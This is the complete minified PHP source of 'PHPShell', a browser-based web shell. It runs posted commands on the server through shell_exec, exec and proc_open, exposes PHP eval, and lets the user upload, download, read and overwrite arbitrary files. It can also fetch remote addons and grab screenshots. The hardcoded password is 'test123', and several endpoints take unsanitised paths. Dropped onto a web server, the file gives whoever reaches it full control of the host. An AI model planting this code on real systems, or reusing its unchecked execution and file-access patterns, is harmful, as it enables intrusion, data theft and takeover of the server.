<?php
$GLOBALS["phpshell_min"]=true;
$GLOBALS["phpshell_path"] = __FILE__;
define('PHPSHELL_EOF_MARK','---EOF');
$GLOBALS['REGISTERED_FUNCTIONS'] = array();
$GLOBALS['PHPSHELL_CONFIG'] = array(
'MOTD' => "",
'PHP_PATH' => '',
'MODE' => 'interactive-stdin',
'WIN_PROMPT' => '%cwd%> ',
'NIX_PROMPT' => '%user%@%hostname%:%cwd% #',
'USE_AUTH' => true,
'AUTH_USERNAME' => 'test123',
'AUTH_PASSWORD' => 'test123',
'ENV' => array(
'WIN' => array(),
'NIX' => array()
)
);
?>
<?php
$v0=PHPShell::getArgvAssoc();
function alt_auth(){
?>
<form method="POST">
<input type="password" name="psauth"><input type="submit" value="Enter" />
</form>
<?php
exit;
}
if(@$GLOBALS['PHPSHELL_CONFIG']['USE_AUTH'] && !isset($v0['cmd'])){
if(@$_POST['psauth'] == $GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD']
|| @$_COOKIE['psauth'] == md5($GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD'])){
setcookie('psauth', md5($GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD']),time()+3600);
} else {
if (!isset($_SERVER['PHP_AUTH_USER'])) {
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
if($_SERVER['PHP_AUTH_USER'] != @$GLOBALS['PHPSHELL_CONFIG']['AUTH_USERNAME']
|| $_SERVER['PHP_AUTH_PW'] != @$GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD'])
{
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
}
}
function registerCommand($f,$cmd,$v3=''){
$GLOBALS['REGISTERED_FUNCTIONS'][$cmd] = array('function'=>$f,'help'=>$v3);
}
class PHPShell {
public function __construct(){
@ob_clean();
$v0=$this::getArgvAssoc();
if(isset($v0['cmd'])){
print_r($v0);
print_r($GLOBALS['argv']);
//Appending DIRECTORY_SEPERATOR because a bug in argv.
chdir(realpath($v0['cwd']).DIRECTORY_SEPARATOR);
$this->v4($v0['cmd'],$v0['handle']);
exit;
}
if(isset($_POST['cwd'])){
chdir($_REQUEST['cwd']);
}
if(isset($_POST['action'])){
switch($_POST['action']){
case 'exec':
$this->v5($_POST['cmd'],@$_POST['mode']);
break;
case 'suggest':
$this->v6($_POST['input']);
break;
case 'proc':
$this->v7($_POST['handle']);
break;
case 'stdin':
$this->v8($_POST['stdin'],$_POST['handle']);
break;
default:
echo json_encode(array('error' => 'Unknown action.'));
break;
}
} else {
$v9 = $GLOBALS['__CSS'];
$v10 = $GLOBALS['__JS'];
$v11 = $GLOBALS['PHPSHELL_CONFIG'];
unset($v11['AUTH_USERNAME']);
unset($v11['AUTH_PASSWORD']);
?><!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PHPShell</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
var SHELL_INFO = <?php echo json_encode($this->v12());?>;
</script>
<script type="text/javascript">
<?php   ?>var PHPShell = {};
(function(phpshell){
$(function(){
var input = '';
var history = [];
try {
history = JSON.parse(localStorage.getItem('hist')) || [];
} catch(e){}
var currentHistory = 0;
var $pre = $('<pre>');
$('body > *').each(function(){
$(this).remove();
});
var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';
var supportedModes = ['interactive','shell_exec','exec'];
var onCommandListeners = [];
$('body').append($pre);
var $v14 = $('<span class="output"></span>');
$pre.append($v14);
var $v15 = $('<input class="input">');
$pre.append($v15);
$('body').append($('<div class="bg"></div>'));
$v15.focus();
$v15.css('min-width','100px');
var procStdIn = [];
var currentHandle = false;
var suggestions = [];
var currentSuggestion = 0;
var lastKey = 0;
var echoKeyboard = true;
$v15.keyup(function(e){
if(currentHandle != false){
var strIn = $v15.val();
if(strIn.length > 0){
procStdIn.push(strIn);
$v15.val('');
}
if(e.which == 13||e.which==10){
procStdIn.push(String.fromCharCode(10));
}
sendStdIn();
}
});
$v15.keydown(function(e){
if(currentHandle != false){
return;
}
switch(e.which){
case 9:
if(lastKey != 9){
suggestions = [];
$.ajax(window.location.href,{
async: true,
dataType: 'json',
type:'post',
data:{
action:'suggest',
cwd:SHELL_INFO.cwd,
input:$v15.val()
}
}).done(function(data){
suggestions = data.suggestions;
$v15.val(suggestions[currentSuggestion]);
$v15.css('width',12+($v15.val().length*12));
});
currentSuggestion = 0;
} else if(suggestions.length > 0) {
currentSuggestion++;
if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
else $v15.val(suggestions[currentSuggestion]);
$v15.val(suggestions[currentSuggestion]);
$v15.css('width',12+($v15.val().length*12));
}
lastKey = 9;
e.preventDefault();
return false;
break;
case 38:
currentHistory++;
if(currentHistory > history.length){
currentHistory = 0;
$v15.val('');
} else {
$v15.val('');
setTimeout(function(){
$v15.val(history[history.length-currentHistory]);
$v15.css('width',12+($v15.val().length*12));
},50);
}
break;
case 40:
currentHistory--;
if(history < 0){
history = 0;
$v15.val('');
} else
$v15.val(history[history.length-currentHistory]);
break;
case 13:
runStatement();
break;
default: console.log(e.which);
break;
}
lastKey = e.which;
$v15.css('width',12+($v15.val().length*12));
});
function animateCursor(){
$("html, body").stop();
$("html, body").animate({ scrollTop: $(document).height() }, 2500);
}
function write(s){
$v14.append(s);
}
function writeln(s){
$v14.append(s+'\n');
}
function writeCwdLine(){
var cwdStr = SHELL_INFO.prompt_style;
var cwdVars = {
cwd : SHELL_INFO.cwd,
hostname : SHELL_INFO.hostname,
user : SHELL_INFO.user
};
$.each(cwdVars,function(i){
cwdStr = cwdStr.replace('%'+i+'%',this);
});
write('\n<span class="cwd">'+cwdStr+'</span>');
}
function readProc(){
$.post(window.location.href,{action:'proc',handle:currentHandle,cwd:SHELL_INFO.cwd}, function(response){
if(response.out !== "")
write(response.out);
if(!response.eof){
readProc();
} else {
currentHandle = false;
writeCwdLine();
}
animateCursor();
},"json").error(function(){
readProc();
});
}
function sendStdIn(){
if(currentHandle && procStdIn.length > 0){
if(echoKeyboard)
$.each(procStdIn,function(i){
write(this);
});
$.post(window.location.href,{stdin:procStdIn,handle:currentHandle,action:'stdin'},function(){
});
procStdIn = [];
}
}
function runStatement(){
var statement = $v15.val();
if(history[history.length-1] !== statement){
history.push(statement);
localStorage.setItem('hist', JSON.stringify(history));
}
currentHistory = 0;
$v15.val('');
writeln(statement);
if(statement == "clear" || statement == "cls"){
$v14.html('');
writeCwdLine();
return;
}
var stopPropagation = false;
$(onCommandListeners).each(function(){
if(this.call(phpshell,statement) === false){
stopPropagation = true;
return false;
}
});
if(stopPropagation){
console.log('preventdefault');
writeCwdLine();
return false;
}
var setMode = statement.match(/^xsetmode *([a-z-_]*)/);
if(setMode && setMode.length == 2){
if($.inArray(setMode[1],supportedModes) > -1){
mode = setMode[1];
writeln('PHPShell mode set to '+mode);
localStorage.setItem('ps_xmode', mode);
} else {
writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
+ "\nCurrent mode: "+mode);
}
writeCwdLine();
return;
}
var xecho = statement.match(/xecho (true|false|0|1|on|off)/);
if(xecho){
if($.inArray(xecho[1],['true','on','1']) > -1){
echoKeyboard = true;
writeln('Keyboard echo enabled.');
} else {
echoKeyboard = false;
writeln('Keyboard echo disabled.');
}
writeCwdLine();
return;
}
$.post(window.location.href,{action:'exec',cwd:SHELL_INFO.cwd,cmd:statement,mode:mode},function(response){
if(mode == "interactive" && response.handle){
currentHandle = response.handle;
procStdIn = [];
readProc();
} else {
write(response.html ? response.output : document.createTextNode(response.output));
SHELL_INFO.cwd = response.cwd;
writeCwdLine();
animateCursor();
}
},"JSON").error(function(r){ write(r.responseText); writeCwdLine(); });
}
phpshell.onCommand = function(callback){
onCommandListeners.push(callback);
};
phpshell.writeln = writeln;
phpshell.write = write;
phpshell.writeCwdLine = writeCwdLine;
writeln(SHELL_INFO.motd);
writeCwdLine();
});
})(PHPShell);
<?php ?>
<?php echo @$GLOBALS['__JS']; ?>
</script>
<style>
<?php echo @$GLOBALS['__CSS']; ?>
.input {
border:none;
outline-width: 0;
font-family: monospace;
font-size:12px;
padding:0px;
margin:0px;
}
</style>
</head>
<body>
</body>
</html>
<?php
}
exit;
}
private $v16;
private $v17;
private $v18;
private function v19($cmd){
$v18 = md5($cmd.time());
$this->handle = $v18;
file_put_contents($this->v20('stdout'), '');
$v0 = array(
'handle' => $v18,
'cmd' => $cmd,
'cwd' => getcwd()
);
$c =
$this->v22()." "
. $GLOBALS['phpshell_path']
. self::arrayToArgs($v0);
echo json_encode(array('handle'=>$v18,'cwd'=>getcwd()));
chdir(dirname($GLOBALS['phpshell_path']));
if(PHPShell::isWindows()){
pclose(popen("start /MIN $c", "r"));
} else {
shell_exec("nohup $c > /dev/null 2>/dev/null &");
}
return $v18;
}
private static function arrayToArgs($v23){
$str = '';
foreach($v23 as $k => $v){
$v = escapeshellarg($v);
$str .= " -$k $v";
}
return $str;
}
private function v22(){
$v27 = array();
$v28 = dirname(__FILE__).DIRECTORY_SEPARATOR.'phpshell-phpbin-path';
if(isset($GLOBALS['PHPSHELL_CONFIG']['PHP_PATH'])
&& file_exists($GLOBALS['PHPSHELL_CONFIG']['PHP_PATH'])){
return $GLOBALS['PHPSHELL_CONFIG']['PHP_PATH'];
}
$v29 = @file_get_contents($v28);
if($v29){
return $v29;
} else {
if(PHPShell::isWindows()){
$v27 = array(
'php',
'c:\php\php.exe',
'c:\php5\php.exe',
'c:\xampp\php\php.exe',
'c:\wamp\php\php.exe',
'c:\program files\php\php.exe'
);
} else {
$v27 = array(
'php',
'php-cli',
'/bin/php',
'/bin/php-cli',
'/usr/bin/php',
'/usr/bin/php-cli',
'/Applications/MAMP/php/php',
);
}
foreach($v27 as $p){
$r = shell_exec($p.' -v');
if($r){
file_put_contents($v28, $p);
return $p;
}
}
}
file_put_contents($this->v20('stdout'), "\nERROR: Could not find php executable.".
"\nIf you now where it is you can specify it in phpshell-config.php or with the xphppath command\n".
PHPSHELL_EOF_MARK);
return 'php';
}
private function v8($v32,$v18){
$this->handle = $v18;
$v33 = str_replace("\r", "\n", $v32);
file_put_contents($this->v20('stdin'), $v33,FILE_APPEND);
}
public static function getArgvAssoc(){
global $argv,$argc;
$v34 = array();
for($i=0; $i < $argc; $i++){
$v36 = strpos($argv[$i+1],'-') === 0;
if(strpos($argv[$i],'-') === 0){
$v34[trim($argv[$i],'-')] = (isset($argv[$i+1]) && !$v36)
? $argv[$i+1] : true;
if(!$v36) $i++;
}
}
return $v34;
}
private function v20($v37){
return dirname(__FILE__).DIRECTORY_SEPARATOR.$this->handle.'-'.$v37;
}
private function v4($cmd,$v18){
$this->handle = $v18;
file_put_contents($this->v20('stdout'), '');
file_put_contents($this->v20('stdin'),'');
$v38 = array(
0 => array("pipe", "r"),
1 => array("file", $this->v20('stdout'),"a"),
2 => array("file", $this->v20('stdout'),"a"),
);
foreach($GLOBALS['PHPSHELL_CONFIG'][self::isWindows()?'WIN':'NIX']['ENV'] as $k => $env){
putenv("$k=$env");
}
$this->v16 = proc_open($cmd, $v38, $this->pipes, getcwd());
$v40 = proc_get_status($this->v16);
$v41 = false;
while($v40['running']){
echo '.';
if(time() - filemtime($this->v20('stdin')) > 60){
clearstatcache(true, $this->v20('stdin'));
}
if(time() - filemtime($this->v20('stdin')) > 60){
$v41 = true;
break;
}
$v32 = @file_get_contents($this->v20('stdin'));
if($v32 !== '' && $v32 !== false){
file_put_contents($this->v20('stdin'),'');
fwrite($this->pipes[0],$v32);
} else {
usleep(250000);
}
$v40 = proc_get_status($this->v16);
}
proc_close($this->v16);
if(!$v41){
file_put_contents($this->v20('stdout'),PHPSHELL_EOF_MARK,FILE_APPEND);
sleep(1);
}
@unlink($this->v20('stdout'));
@unlink($this->v20('stdin'));
}
public function v7($v18){
$this->handle = $v18;
$v42 = "";
$eof = false;
$v44 = 0;
while($v42 === ""){
$v42 = @file_get_contents($this->v20('stdout'));
if($v42)
file_put_contents($this->v20('stdout'), '');
usleep (500000);
if($v44 == 0){
$v44 = 30;
touch($this->v20('stdin'));
}
$v44--;
}
if(strpos($v42, PHPSHELL_EOF_MARK) !== false){
$v42 = str_replace(PHPSHELL_EOF_MARK,'',$v42);
@unlink($this->v20('stdout'));
@unlink($this->v20('stdin'));
$eof=true;
}
$v45 = mb_detect_encoding($v42,mb_list_encodings(),true);
if($v45 != 'UTF-8'){
$v42 = iconv($v45, 'UTF-8//TRANSLIT//IGNORE', $v42);
}
echo json_encode(array('out' => htmlentities($v42,null,'UTF-8'),'eof'=>$eof));
}
public static function strToArgv($str, $v46=false){
preg_match_all("#\"[^\"]+\"|'[^']+'|[^ ]++#", $str, $v0);
$argv = array();
foreach($v0[0] as $arg){
$argv[] = $v46 ? $arg : str_replace(array('"',"'"), '', $arg);
}
return $argv;
}
private function v5($cmd,$v48="shell_exec"){
$v14 = $this->v49($cmd);
$v50 = true;
if($v14 === null){
$v50 = false;
if($v48=="shell_exec" || !$v48){
$v14 = shell_exec($_REQUEST['cmd'].' 2>&1');
} elseif($v48=="exec") {
$v51 = -1;
$v14 = "";
exec($_REQUEST['cmd'].' 2>&1', $v14, $v51);
$v14 = implode($v14,"\n");
} elseif($v48 == "interactive") {
$this->v19($cmd);
exit;
}
}
$v45 = mb_detect_encoding($v14, mb_list_encodings(),true);
if($v45 != 'UTF-8'){
$v14 = iconv($v45, 'UTF-8//TRANSLIT//IGNORE', $v14);
}
echo json_encode(array(
'output' => $v14,
'html' => $v50,
'cwd' => getcwd()
));
exit;
}
private function v6($i){
$v52 = array();
$v15 = self::strToArgv($i);
$cmd = '';
if(count($v15) > 1){
$v53 = $v15[count($v15)-1];
unset($v15[count($v15)-1]);
$cmd = implode(' ',$v15).' ';
} else {
$v53 = $v15[0];
if(preg_match("#[ ]$#", $i)){
$v53 = '';
$cmd = $v15[0].' ';
}
}
foreach(glob($v53.'*') as $f){
//append directory separator on dirs
if(is_dir($f)) $f .= DIRECTORY_SEPARATOR;
if(strpos($f,' ') !== false) $f = '"'.$f.'"';
$v52[] = $cmd.$f;
}
$v52[] = $i;
echo json_encode(array('suggestions'=>$v52));
exit;
}
private function v49($v54){
$v54 = explode(' ', $v54,2);
$cmd = $v54[0];
$v0 = @$v54[1];
if(isset($GLOBALS['REGISTERED_FUNCTIONS'][$cmd])){
ob_start();
$v55 = $GLOBALS['REGISTERED_FUNCTIONS'][$cmd]['function'];
$v55($v0);
return ob_get_clean();
}
return null;
}
private function v12(){
return array(
'cwd' => getcwd(),
'motd' => $this->v56(),
'user' => function_exists('posix_getlogin')
? posix_getlogin()
: (
(function_exists('shell_exec') && PHPShell::isWindows())
? trim(shell_exec('echo %USERNAME%'))
: '?'
),
'mode' => $GLOBALS['PHPSHELL_CONFIG']['MODE'],
'hostname' => function_exists('gethostname') ? gethostname() : 'unknown-host',
'prompt_style' => $GLOBALS['PHPSHELL_CONFIG'][PHPShell::isWindows()?'WIN_PROMPT':'NIX_PROMPT']
);
}
private function v56(){
$v57 = 'PHP-Shell - '.php_uname();
if(isset($GLOBALS['PHPSHELL_CONFIG']['MOTD']))
$v57 .= "\n\n".$GLOBALS['PHPSHELL_CONFIG']['MOTD']."\n";
$v57 .= "\nEnter 'help' to get started.";
return $v57;
}
public static function isWindows(){
return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}
}
?>
<?php
function phpshell_cd($v0){
$v0 = PHPShell::strToArgv($v0);
$v0 = $v0[0];
if(file_exists($v0))
chdir($v0);
elseif(file_exists(getcwd().'/'.$v0))
chdir(getcwd().'/'.$v0);
echo 'Changed directory to: '.getcwd();
}
registerCommand('phpshell_cd','cd','Change directory');
function phpshell_wget($v0){
$v0 = PHPShell::strToArgv($v0);
if(isset($v0[0]) && filter_var($v0[0],FILTER_VALIDATE_URL) !== FALSE){
$v58 = $v0[1] ? $v0[1] : pathinfo($v0[0],PATHINFO_FILENAME);
echo "Downloading: $v0[0]...\n";
file_put_contents($v58, file_get_contents($v0[0]));
echo "Saved download as '$v58'\n";
} else echo "Invalid url\n";
}
registerCommand('phpshell_wget','dl','Download file \'dl source dest\'');
function phpshell_eval($v0){
if(preg_match('#;|echo\b|print[ (]|return#', $v0))
eval($v0);
else
var_dump(eval("return $v0;"));
}
registerCommand('phpshell_eval','eval','PHP eval()');
function phpshell_help($v0){
foreach($GLOBALS['REGISTERED_FUNCTIONS'] as $cmd => $v59){
echo str_pad($cmd, 25);
echo $v59['help'];
echo "\n";
}
}
registerCommand('phpshell_help','help','The command you just called');
function phpshell_lc($v0){
echo count(file($v0));
}
if(PHPShell::isWindows())
registerCommand('phpshell_lc','lc','line count');
function _ls_formatbytes($v60, $v61 = 2) {
$v62 = array('B ', 'KB', 'MB', 'GB', 'TB');
$v60 = max($v60, 0);
$pow = floor(($v60 ? log($v60) : 0) / log(1024));
$pow = min($pow, count($v62) - 1);
$v60 /= pow(1024, $pow);
return round($v60, $v61) . ' ' . $v62[$pow];
}
function phpshell_ls($ls){
foreach(glob($ls ? $ls : '*') as $v65){
echo str_pad(
is_dir($v65)
? '--DIR--'
: _ls_formatbytes(filesize($v65)),10,' ',STR_PAD_LEFT)
. " " . $v65 . "\n";
}
}
if(PHPShell::isWindows())
registerCommand('phpshell_ls','ls','List directory content');
else
registerCommand('phpshell_ls','list','List directory content');
function phpshell_build_util($v0){
$v0 = PHPShell::strToArgv($v0);
print_r($v0);
$v66 = in_array('--replace', $v0);
$v67 = in_array('--keep', $v0);
$gz = in_array('--gz', $v0);
$v69 = array();
$v70 = in_array('without', $v0);
$v71 = in_array('with', $v0);
$v72 = false;
foreach($v0 as $a){
if(preg_match("#^--dest=(.+)#", $a, $m)){
$v72 = $m[1];
}
}
if($v66 && $GLOBALS['phpshell_min']){
$v72 = $GLOBALS['phpshell_path'];
}
if(count($v0) < 2 || !($v67 || $v72)){
echo "\nYou must at least specify all addons or include / exclude and either --keep, --replace or --dest. --replace and --dest will only keep gz comp if it can";
echo "\nExamples: ";
echo "\nqpk rebuild with cd ls qedit qget qput qpk --replace #Replace current phpshell with light custom version";
echo "\nqpk rebuild without qpk screenprint txttoart --keep #Keep build folder and build a semi bloated version without qpk, screenprint and txttoart";
echo "\nqpk rebuild all --dest=/move/build/here #build with all addons and move build files to dest";
exit;
}
$v75 = "build_phpshell/php-shell-master";
$v76 = "$v75/addons";
copy('https://github.com/EJTH/php-shell/archive/master.zip','phpshell_master.zip');
_unzip('phpshell_master.zip', 'build_phpshell/');
if(file_exists('build_phpshell/')){
echo "\nBuilding...\n";
foreach(glob("$v76/*.php") as $a){
$a = pathinfo($a, PATHINFO_FILENAME);
$v77 = in_array($a, $v0);
if(($v70 && $v77) || ($v71 && !$v77)){
unlink("$v76/$a.php");
} else {
$v69[] = $a;
}
}
if(in_array('all', $v0)) $v69 = "all";
echo "Building with addons: " . implode(", ",$v69);
file_put_contents("$v75/phpshell-config.php",'<?php $GLOBALS[\'PHPSHELL_CONFIG\'] = json_decode(\'' . json_encode($GLOBALS['PHPSHELL_CONFIG']) . '\',true);?>');
passthru("cd $v75/ && rm -f phpshell-min.php phpshell-min-gz.php && php phpshell-build.php && echo Succesfully build");
passthru('pwd');
if($v72){
if(!$gz){
copy("$v75/phpshell-min.php", $v72);
} else {
copy("$v75/phpshell-min-gz.php", $v72);
}
}
if(!$v67){
echo "removing build dir";
passthru("rm -rf build_phpshell");
}
unlink('phpshell_master.zip');
}
}
function _unzip($s,$d){
$zip = new ZipArchive;
$res = $zip->open($s);
if ($res === TRUE) {
$zip->extractTo($d);
$zip->close();
return true;
}
}
registerCommand('phpshell_build_util','qbuild','Rebuild with addons');
?>
<?php   
function phpshell_qedit($v0){
echo '<div class="qedit" data-file="'.htmlentities($v0).'"><textarea>'.@str_replace(['<','>'],['&lt;','&gt;'],file_get_contents(realpath($v0))).'</textarea><button class="save">Save</button></div>';
}
if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}
registerCommand('phpshell_qedit','qedit','Edit various data files. supported: txt');
?>
<?php   
$v85 = pathinfo($GLOBALS['phpshell_path'], PATHINFO_DIRNAME) . '/phpshell_addons/';
foreach(glob("$v85/*.php") as $a){
include_once $a;
}
function phpshell_qpk($v0){
$v0 = PHPShell::strToArgv($v0);
switch($v0[0]){
case 'install':
$v86 = $v0[1];
$v85 = pathinfo($GLOBALS['phpshell_path'], PATHINFO_DIRNAME) . '/phpshell_addons/';
$v87 = "https://raw.githubusercontent.com/EJTH/php-shell/master/addons/$v86.php";
if(!file_exists($v85)) mkdir($v85);
if(file_exists($v85)){
error_reporting(E_ALL);
if( copy($v87,$v85 . $v0[1] . '.php') ){
echo "Installed $v87";
} else {
echo "Failed to install $v87";
}
} else {
echo "No addon folder found. Please create writeable directory at $v85";
}
break;
case 'list':
$v88 = explode("\n",file_get_contents("https://raw.githubusercontent.com/EJTH/php-shell/master/qpk_list"));
foreach($v88 as $a){
if(strpos($a, $v0[1]) !== false || empty($v0[1])){
echo "\n$a";
}
}
break;
default:
echo "list | install | remove";
break;
}
}
registerCommand('phpshell_qpk','qpk','Manage addons (list | install | remove)');
?>
<?php   
function phpshell_qput($v0){
echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
}
function phpshell_qput_frm(){
echo '<form method="post" enctype="multipart/form-data"><input type="hidden" name="cwd" value"'.htmlentities($_GET['cwd']).'" /><input onchange="this.parentNode.submit();" type="file" name="qput" /></form>';
}
if(isset($v89['qput'])){
move_uploaded_file($v89['qput']['tmp_name'], $v89['qput']['name']);
}
if(isset($_GET['qputfrm'])){
phpshell_qput_frm();
exit;
}
registerCommand('phpshell_qput','qput','Put file(s)');
?>
<?php   
function phpshell_qwget($v0){
$v0 = PHPShell::strToArgv($v0);
if(count($v0) == 0){
echo "Usage: qwget URL [FILE]";
} else {
$v90 = fopen($v0[0], "r");
$fn = isset($v0[1]) ? $v0[1]
: pathinfo($v0[1], PATHINFO_BASENAME);
$v92 = fopen($fn, 'w');
if($v90 === FALSE) echo "Failed to get url: " + $v0[0];
if($v92 === FALSE) echo "Failed to get create file: " + $v0[1];
while (!feof($v90)) {
echo ".";
fwrite($v92, fread($v90, 512));
}
echo "Downloaded file to: $fn";
fclose($v92);
}
}
if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}
registerCommand('phpshell_qwget','qwget','When you need curl or wget, but neither are there.');
?>
<?php
function phpshell_prntscrn($v0){
echo '<img src="?printscreen='.time().'" alt="[LOADING SCREENSHOT]" style="max-width:80%" />';
}
if(isset($_GET['printscreen'])){
$im = imagegrabscreen();
imagepng($im);
}
if(PHPShell::isWindows())
registerCommand('phpshell_prntscrn','prntscrn','Print screenshot to shell');
function phpshell_tail($v0){
$v42 = file($v0);
if(!$v42){
echo 'Could not open file:'.$v0;
return;
}
$v94 = array();
$lc = 25;
if(preg_match("#-n ([0-9]+)#", $v0, $v94)){
$lc = $v94[1];
}
$v96 = count($v42);
for($i=max($v96-$lc,0);$i<$v96;$i++){
echo str_pad($i+1,5).htmlentities($v42[$i]);
}
}
if(PHPShell::isWindows())
registerCommand('phpshell_tail','tail','Get last lines from file (-n [lc])');
function phpshell_txt2art($i,$ret=false){
$v0 = PHPShell::strToArgv($i);
$str = utf8_decode($v0[0]);
$v98 = @$v0[1] ? $v0[1] : 5;
$imW = strlen($str)* imagefontwidth($v98);
$imH = imagefontheight($v98);
$im = imagecreate($imW,$imH);
$bg = imagecolorallocate($im, 255, 255, 255);
$v102 = imagecolorallocate($im, 0, 0, 0);
$v103 = @$v0[2] ? $v0[2] : '#';
$v104 = @$v0[3] ? $v0[3] : ' ';
imagestring($im, $v98, 0, 0, $str, $v102);
$out = '';
for($y = 0; $y<$imH; $y++){
for($x = 0; $x < $imW; $x++){
$out .= (imagecolorat($im, $x, $y) == $v102) ? $v103: $v104;
}
$out .= "\n";
}
echo $out;
if($ret)return $out;
if(file_put_contents('txt2art.out',$out)){
echo "\nSaved to: txt2art.out";
}
}
registerCommand('phpshell_txt2art','txt2art','String to "ascii-art"');
function phpshell_view($v0){
if(file_exists($v0)){
$ext = pathinfo($v0,PATHINFO_EXTENSION);
switch($ext){
case 'jpg':
case 'jpeg':
case 'png':
case 'bmp':
case 'gif':
$v59 = getimagesize($v0);
echo '<img src="?view_img='.urlencode(realpath($v0)).'" style="max-width:80%" />';
echo "\n$v59[mime] ($v59[0] x $v59[1])";
break;
default:
$v109 = file($v0);
foreach($v109 as $l => $s){
echo str_pad($l+1,8).htmlentities($s);
}
break;
}
}
}
if(isset($_GET['view_img'])){
echo file_get_contents($_GET['view_img']);
}
registerCommand('phpshell_view','view','View various data files. supported: jpeg, png, bmp, gif, txt, php');
$GLOBALS['__JS'] = <<<JSHERE
\$(function(){
PHPShell.onCommand(function(statement){
if(statement.match(/^help/)){
\$([
'Client commands:',
'xsetmode shell_exec | interactive',
'xecho on | off',
'help',
'',
'PHP commands:'
]).each(function(){
PHPShell.writeln(this);
});
}
});
})
\$(function(){
\$(document).on('click','.qedit .save', function(e){
var \$v111 = \$(this.parentNode);
\$.post(window.location.href,{
qedit_content : \$v111.find('textarea').val(),
qedit_fn : \$v111.data('file')
}, function(){
\$v111.replaceWith('Saved');
});
});
})
JSHERE;
$GLOBALS['__CSS'] = <<<CSSHERE
.cwd {
color: red;
}
body,.input {
text-shadow: 2px 2px #000;
color:#eee;
}
html,body {
margin:0px;
padding:0px;
}
.qedit {
}
.qedit textarea {
display:block;
width: 90%;
min-height: 300px;
opacity: 0.2;
}
.bg {
background: #45484d;
background: -moz-linear-gradient(top, #45484d 0%, #000000 100%);
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#45484d), color-stop(100%,#000000));
background: -webkit-linear-gradient(top, #45484d 0%,#000000 100%);
background: -o-linear-gradient(top, #45484d 0%,#000000 100%);
background: -ms-linear-gradient(top, #45484d 0%,#000000 100%);
background: linear-gradient(to bottom, #45484d 0%,#000000 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#45484d', endColorstr='#000000',GradientType=0 );
position:fixed;
width:100%;
height:100%;
top:0px;
z-index:1;
}
pre {
z-index:2;
position:relative;
padding:16px;
}
.input {
background:transparent;
}
a {
color:#fff;
}
CSSHERE;
$GLOBALS['phpshell'] = new PHPShell(); ?>